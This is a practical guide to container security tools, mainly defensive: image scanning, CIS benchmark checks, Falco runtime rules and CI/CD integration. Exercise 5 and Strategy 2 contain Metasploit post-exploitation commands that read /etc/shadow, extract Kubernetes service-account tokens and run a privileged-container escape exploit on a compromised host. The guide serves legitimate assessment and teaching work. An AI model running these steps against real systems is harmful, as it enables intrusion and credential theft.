# Container Security Tools Practical Guide

## Introduction

Container security tools form the operational backbone of any containerized environment assessment. This guide provides hands-on exercises for each major container security tool, covering installation, practical usage patterns, output interpretation, and integration strategies. The tools span the full container lifecycle: image analysis, runtime monitoring, configuration auditing, and orchestration platform assessment.

Understanding how each tool works at a practical level is essential for both offensive and defensive security work. From the offensive side, these tools help identify attack surfaces and misconfigurations. From the defensive side, they establish baselines and detect deviations. This guide focuses on real command-line usage with practical examples that can be applied directly during security assessments.

### Tool Category Overview

| Category | Tools | Primary Use Case |
|----------|-------|------------------|
| Image Scanning | trivy, grype, clair | CVE detection, secret scanning, misconfig detection |
| Benchmark Compliance | docker-bench-security, kube-bench | CIS benchmark validation |
| Runtime Monitoring | falco, sysdig | Anomaly detection, syscall monitoring |
| Configuration Audit | kubeaudit, checkov | K8s manifest validation, RBAC review |
| Policy Enforcement | anchore, opa-gatekeeper | Admission control, compliance gates |
| Penetration Testing | kube-hunter, peirates, Metasploit modules | Active exploitation, lateral movement |

## Hands-on Exercises

### Exercise 1: Comprehensive Image Scanning with Trivy

Trivy is the most versatile container security scanner, supporting images, filesystems, code repositories, Kubernetes configurations, and cloud infrastructure files. It should be the first tool in any container security assessment.

```bash
# Install trivy
sudo apt-get install -y trivy
# Or via direct download:
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb generic main" | sudo tee /etc/apt/sources.list.d/trivy.list
sudo apt-get update && sudo apt-get install -y trivy

# Basic image scan - identify all vulnerabilities
trivy image nginx:latest

# Filter by severity (most useful for quick triage)
trivy image --severity HIGH,CRITICAL nginx:latest

# Scan for misconfigurations in Dockerfile
trivy config Dockerfile

# Scan for secrets leaked in image layers
trivy image --scanners secret nginx:latest

# Generate SBOM (Software Bill of Materials)
trivy image --format spdx-json --output sbom.json nginx:latest

# Scan Kubernetes manifests for security issues
trivy config kubernetes-manifests/

# Scan a running container's filesystem
docker cp CONTAINER_ID:/ trivy-scan/
trivy fs --severity HIGH,CRITICAL trivy-scan/

# Output JSON for automated processing
trivy image --format json --output report.json nginx:latest
```

**Output Interpretation Table**:

| Field | Meaning | Action |
|-------|---------|--------|
| Total: 0 | No vulnerabilities found | Verify scanner database is current |
| FIXED version available | Patch exists upstream | Prioritize update |
| Unfixed | No patch yet | Apply mitigations, monitor advisories |
| Status: affected | Vulnerability matches installed version | Remediate immediately |
| Primary URL | Link to CVE details | Review for exploitability context |

### Exercise 2: Rapid Vulnerability Assessment with Grype

Grype excels at fast vulnerability scanning with precise package matching. It is particularly effective when integrated into CI/CD pipelines where scan speed matters.

```bash
# Install grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Basic scan
grype nginx:latest

# Scan from SBOM (faster for repeated scans)
syft nginx:latest -o spdx-json > sbom.json
grype sbom:sbom.json

# Only show fixed vulnerabilities
grype --only-fixed nginx:latest

# Custom output for CI/CD pass/fail
grype --fail-on critical nginx:latest
echo "Exit code: $? (1 = critical vulns found)"

# Scan local directory (for development workflow)
grype dir:./my-application

# Compare two image versions for delta
grype myapp:v1.0 --output json > v1-report.json
grype myapp:v2.0 --output json > v2-report.json
# Diff the reports to see what changed
```

**Grype vs Trivy Decision Matrix**:

| Criterion | Trivy | Grype |
|-----------|-------|-------|
| Scan speed | Fast | Faster |
| Vulnerability coverage | Broad | Broad |
| Secret scanning | Yes | No (use syft+grype) |
| Misconfig detection | Yes | No |
| SBOM generation | Built-in | Requires syft |
| K8s manifest scanning | Yes | No |
| Best for | All-in-one scanning | CI/CD speed gates |

### Exercise 3: CIS Benchmark Compliance with Docker Bench

Docker Bench for Security automates CIS Docker Benchmark checks. It evaluates host configuration, Docker daemon settings, image management, container runtime, and network configuration.

```bash
# Clone and run
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
sudo bash docker-bench-security.sh

# Run specific test sections
# Section 1: Host Configuration
# Section 2: Docker Daemon Configuration
# Section 3: Docker Daemon Configuration Files
# Section 4: Container Images and Build Files
# Section 5: Container Runtime
# Section 6: Docker Operations
# Section 7: Docker Swarm Configuration
sudo bash docker-bench-security.sh -c 1,2,5

# JSON output for automated reporting
sudo bash docker-bench-security.sh -f json > benchmark-report.json

# Run inside a container (avoids host dependency)
docker run --rm --net host --pid host \
  --userns host --cap-drop audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /lib/systemd/system:/lib/systemd/system:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  docker/docker-bench-security
```

**Common Findings and Remediation**:

| Check ID | Finding | Risk Level | Remediation |
|----------|---------|------------|-------------|
| 1.1.1 | User namespace not enabled | Medium | Enable userns-remap in daemon.json |
| 2.1 | TLS not configured | High | Configure TLS for Docker daemon |
| 4.1 | Trusted image not verified | High | Enable DOCKER_CONTENT_TRUST=1 |
| 5.7 | Container running privileged | Critical | Remove --privileged flag |
| 5.10 | Memory limit not set | Medium | Set --memory on all containers |
| 5.11 | CPU priority not set | Low | Set --cpu-shares appropriately |
| 5.28 | PID limit not set | Medium | Set --pids-limit to prevent fork bombs |
| 5.31 | Docker socket mounted | Critical | Remove docker.sock volume mounts |

### Exercise 4: Kubernetes Benchmark with Kube-bench

Kube-bench applies CIS Kubernetes Benchmark tests to master nodes, worker nodes, and etcd. It validates API server flags, kubelet configuration, and cluster security posture.

```bash
# Install kube-bench
curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_arm64 \
  -o /usr/local/bin/kube-bench
chmod +x /usr/local/bin/kube-bench

# Run against master node components
kube-bench master

# Run against worker node components
kube-bench node

# Run against etcd specifically
kube-bench etcd

# Run specific CIS benchmark version
kube-bench master --benchmark cis-1.8

# Run as a Kubernetes Job for managed clusters
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job-master.yaml
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job-node.yaml

# Check results
kubectl logs job/kube-bench-master
kubectl logs job/kube-bench-node
```

**Critical Master Node Checks**:

| Check | Command Flag | Required Setting |
|-------|-------------|------------------|
| Anonymous auth | --anonymous-auth | false |
| RBAC enabled | --authorization-mode | Must include RBAC |
| Audit logging | --audit-log-path | Must be set |
| Etcd TLS | --etcd-certfile, --etcd-keyfile | Must be configured |
| Kubelet client cert | --kubelet-client-certificate | Must be configured |
| Secure port | --secure-port | Must be > 0 |

### Exercise 5: Container Discovery with Metasploit Modules

When performing penetration testing on a compromised host, Metasploit provides container-specific post-exploitation modules for environment detection and enumeration.

```bash
# Start Metasploit
msfconsole

# Check if running inside a container
use post/linux/gather/checkcontainer
set SESSION 1
run

# Output examples:
# [+] This appears to be a 'Docker' container
# [+] This appears to be a 'LXC' container
# [+] This appears to be a 'systemd nspawn' container
# [*] This does not appear to be a container

# Enumerate all containers on the host
use post/linux/gather/enum_containers
set SESSION 1
run

# Execute commands inside specific containers
set CMD "env"
run
# Reveals environment variables including potential secrets

set CMD "cat /etc/shadow"
run
# Attempts to read shadow file from each container

set CMD "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
run
# Extracts Kubernetes service account tokens

# Privilege escalation via container escape
use exploit/linux/local/docker_privileged_container_kernel_escape
set SESSION 1
run
```

### Exercise 6: Runtime Monitoring with Falco

Falco provides real-time detection of anomalous behavior in containerized environments by monitoring system calls via kernel module or eBPF.

```bash
# Install Falco
curl -s https://falco.org/repo/falcosecure-packages.asc | sudo apt-key add -
echo "deb https://download.falco.org/packages/deb stable main" | sudo tee -a /etc/apt/sources.list.d/falcosecurity.list
sudo apt-get update && sudo apt-get install -y falco

# Start Falco with default rules
sudo falco

# Custom rules for container escape detection
sudo tee /etc/falco/rules.d/container-escape.yaml << 'RULES'
- rule: Container Escape via Privileged Operation
  desc: Detect escape attempts through privileged container operations
  condition: >
    container and
    (evt.type in (mount, umount2, pivot_root, chroot) or
     (evt.type = openat and fd.name startswith /proc/1/root))
  output: >
    Potential container escape detected
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: CRITICAL
  tags: [container, escape]

- rule: Docker Socket Access from Container
  desc: Detect Docker socket access from within a container
  condition: >
    container and fd.name = /var/run/docker.sock and
    evt.type in (open, openat, connect)
  output: >
    Docker socket accessed from container
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: CRITICAL
  tags: [container, escape, docker]

- rule: Kubernetes Secret Access
  desc: Detect reading Kubernetes secrets from inside container
  condition: >
    container and
    (fd.name startswith /var/run/secrets/kubernetes.io or
     fd.name startswith /etc/kubernetes/pki)
  output: >
    Kubernetes secrets accessed
    (user=%user.name command=%proc.cmdline container=%container.name file=%fd.name)
  priority: WARNING
  tags: [kubernetes, secrets]
RULES

# Test Falco rules against expected events
sudo falco -r /etc/falco/rules.d/container-escape.yaml -T
```

### Exercise 7: Policy Enforcement with Anchore

Anchore provides enterprise-grade image policy enforcement, compliance checks, and continuous vulnerability monitoring across container registries.

```bash
# Install anchore-cli
pip install anchorecli

# Quick start with Docker
docker run -d --name anchore-engine -p 8228:8228 anchore/engine
# Wait for engine to initialize
docker logs -f anchore-engine 2>&1 | grep "Engine boot complete"

# Add and analyze image
anchore-cli image add nginx:latest
anchore-cli image wait nginx:latest

# View vulnerability report
anchore-cli image vuln nginx:latest all

# Evaluate against default policy
anchore-cli evaluate check nginx:latest

# List policy bundles
anchore-cli policy list

# Create custom policy for blocking privileged ports
anchore-cli policy add custom-policy.json

# Continuous monitoring setup
anchore-cli registry add myregistry.io myuser mypassword
anchore-cli registry list
```

## Tool Combination Strategies

### Strategy 1: Full Container Security Assessment Pipeline

```bash
#!/bin/bash
# Complete container security assessment script
IMAGE="$1"

echo "=== Phase 1: Image Vulnerability Scan ==="
trivy image --severity HIGH,CRITICAL --format json --output trivy-report.json "$IMAGE"
CRITICAL_COUNT=$(jq '[.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL")] | length' trivy-report.json)
echo "Critical vulnerabilities found: $CRITICAL_COUNT"

echo "=== Phase 2: Secret Detection ==="
trivy image --scanners secret --format json --output secrets-report.json "$IMAGE"
SECRET_COUNT=$(jq '[.Results[].Secrets // []] | add | length' secrets-report.json)
echo "Secrets detected: $SECRET_COUNT"

echo "=== Phase 3: CIS Benchmark Check ==="
docker-bench-security -f json > benchmark-report.json 2>/dev/null
echo "Benchmark results saved"

echo "=== Phase 4: Runtime Analysis ==="
docker run -d --name test-container "$IMAGE"
docker cp test-container:/ container-fs/
trivy fs --severity HIGH,CRITICAL container-fs/
docker rm -f test-container

echo "=== Summary ==="
echo "Critical CVEs: $CRITICAL_COUNT"
echo "Secrets found: $SECRET_COUNT"
echo "Full reports: trivy-report.json, secrets-report.json, benchmark-report.json"
```

### Strategy 2: Penetration Testing Container Discovery

```bash
# On a compromised host with Metasploit session
msfconsole -q << 'EOF'
use post/linux/gather/checkcontainer
set SESSION 1
run

use post/linux/gather/enum_containers
set SESSION 1
set CMD "id; hostname; env; cat /etc/passwd"
run

use post/linux/gather/enum_containers
set SESSION 1
set CMD "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null"
run

use exploit/linux/local/docker_privileged_container_kernel_escape
set SESSION 1
run
EOF
```

### Strategy 3: CI/CD Integration

```yaml
# GitHub Actions container security scanning
name: Container Security Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build image
        run: docker build -t test-image:${{ github.sha }} .
      - name: Trivy vulnerability scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'test-image:${{ github.sha }}'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'
      - name: Trivy secret scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'test-image:${{ github.sha }}'
          scanners: 'secret'
      - name: Dockle lint
        uses: goodwithtech/dockle-action@master
        with:
          image: 'test-image:${{ github.sha }}'
          exit-code: '1'
```

## Tool Selection Decision Tree

When approaching a container security assessment, use this decision framework:

1. **Is the target a container image?** Use `trivy image` or `grype` for vulnerability scanning, `trivy --scanners secret` for secret detection.

2. **Is the target a running Docker host?** Use `docker-bench-security` for CIS compliance, `docker inspect` for runtime configuration review.

3. **Is the target a Kubernetes cluster?** Use `kube-bench` for CIS compliance, `kubeaudit` for configuration audit, `kube-hunter` for penetration testing.

4. **Is the target a compromised host?** Use Metasploit `checkcontainer` and `enum_containers` for discovery, then `docker_privileged_container_kernel_escape` for escape.

5. **Is continuous monitoring needed?** Deploy `falco` for runtime anomaly detection, `trivy operator` for continuous image scanning in K8s.

## Common Issues and Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| Trivy database download fails | Network restrictions | Use `--skip-update` with pre-cached DB or `trivy server` mode |
| Docker-bench returns errors | Insufficient privileges | Run as root or inside privileged container |
| Kube-bench cannot connect | Wrong kubeconfig | Set KUBECONFIG env or run as K8s Job |
| Falco kernel module fails | Kernel version mismatch | Use eBPF driver: `falco --driver bpf` |
| Grype SBOM parse error | Unsupported SBOM format | Use CycloneDX or SPDX format from syft |
| Metasploit modules timeout | Session dropped | Re-establish session, check connectivity |

## References

- [Trivy Official Documentation](https://aquasecurity.github.io/trivy/) - Comprehensive scanner reference
- [Grype GitHub Repository](https://github.com/anchore/grype) - Fast vulnerability scanner
- [Docker Bench Security](https://github.com/docker/docker-bench-security) - CIS Docker Benchmark
- [Kube-bench Documentation](https://github.com/aquasecurity/kube-bench) - CIS Kubernetes Benchmark
- [Falco Official Documentation](https://falco.org/docs/) - Runtime security monitoring
- [Anchore Enterprise Documentation](https://docs.anchore.com/) - Policy and compliance platform
- [CIS Docker Benchmark v1.6.0](https://www.cisecurity.org/benchmark/docker) - Security baseline
- [CIS Kubernetes Benchmark v1.8.0](https://www.cisecurity.org/benchmark/kubernetes) - K8s security baseline
- [Metasploit Container Modules](https://www.rapid7.com/db/modules/) - Post-exploitation container tools
- [Kube-hunter Documentation](https://aquasecurity.github.io/kube-hunter/) - K8s penetration testing